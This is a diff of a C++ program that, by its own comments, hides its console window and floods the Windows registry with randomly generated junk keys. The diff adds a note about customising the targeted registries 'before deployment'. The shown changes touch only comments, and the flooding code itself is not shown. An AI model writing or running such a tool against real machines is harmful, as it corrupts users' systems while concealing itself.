@@ -3,20 +3,18 @@
 // Description : This program floods the windows registers with random junk values.
 //
 // Author: Jon Bauer (JonBauer123)
-// Contributers : Russell Babarsky (landy)
-
 #include "pch.h"
 #include <iostream>
 #include <string>
 #include <Windows.h>
 
-// Defines number of keys to create
+// Defines number of keys to create while flooding
 #define NUM_OF_KEYS 50
 
 using namespace std;
 
 /*
-Returns a randomly generated name between 5-10 characters.
+Returns a randomly generated name between 5-10 characters in the wstring format.
 */
 wstring valueNameGen() {
 	wstring str = L"";
@@ -91,6 +89,9 @@ void floodReg(HKEY reg, LPCWSTR regPath) {
 /*
 Main hides the console window and calls floodReg to flood the Registers with
 random junk programs.
+
+These can be added or changed before deployment to customize which registries should be
+flooded with the randomly generated keys.
 */
 int main()
 {
